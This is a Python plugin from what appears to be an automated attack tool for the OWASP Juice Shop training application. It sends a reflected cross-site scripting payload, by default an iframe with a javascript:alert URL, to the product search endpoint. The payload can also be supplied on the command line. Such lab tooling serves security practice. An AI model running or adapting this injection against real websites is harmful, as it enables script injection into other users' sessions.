# SOURCE FILE:    xss_search.py
# PROGRAM:        JuiceShop automating attack application -- Plugin
# FUNCTIONS:      Doing xss injection
#                 Method 1: Using default payload
#                 Method 2: Using specific payload user entered from commandline
#          
# DATE:           Dec 6, 2022
# REVISIONS:      N/A
# PROGRAMMER:     Hugh Song
#
# NOTES
#-----------------------------------------------------------------------------------------------
import time
from . import attack as a
#-----------------------------------------------------------------------------------------------
#Class: xss_search
#Inherit: Attack
#-----------------------------------------------------------------------------------------------
class xss_search(a.attack_inter):

#-----------------------------------------------------------------------------------------------
#FUNCTION: __init__ 
#ARGUMENTS: N/A
#RETURNS: void
#Description: Initial class variables(REST session; URL).
#-----------------------------------------------------------------------------------------------
    def __init__(self, script=None):
        self.script = script
        self.url = a.URL + '/#/search'
        self.bashURL = a.URL+'/rest/products/search'
        
#-----------------------------------------------------------------------------------------------
#FUNCTION generator
#ARGUMENTS: myScript --> the xss injection payload. 
#RETURNS: params --> sub URI
#Description: This function is used to generate needed data from REST requests
#     
#NOTES:
# ALL REST requests needed data like json_data, header, and cookie must generated through this function
#-----------------------------------------------------------------------------------------------
    def generator(self, myScript='<iframe src="javascript:alert(\'xss\')">'):
        params = '?q='+myScript  
        return self.url, params

#-----------------------------------------------------------------------------------------------
#FUNCTION run
#ARGUMENTS: N/A
#RETURNS: N/A
#Description: This is the main function for plugin to send REST requests.
#             
#NOTES: None
#-----------------------------------------------------------------------------------------------
    def run(self):
        a.logging.basicConfig(filename='./test_logging_info.log', 
                            level=a.logging.INFO, format='%(asctime)s %(message)s')
        a.logging.Formatter.converter = time.gmtime
        logger = a.logging.getLogger("XSS Search")
        a.logging.info(logger)
        a.logging.info('Started')

        if self.script:
            myURL,myparams = self.generator(self.script)
        else:
            myURL,myparams = self.generator()
        s = a.requests.Session()
        # myURL = myURL + myparams
        # response = s.post(myURL)


        response = a.requests.Request('GET', myURL)
        p = response.prepare()
        p.url += myparams
        resp = s.send(p, allow_redirects=False)

        print(resp.url)
        print(resp.status_code)
        a.logging.info('Finished')



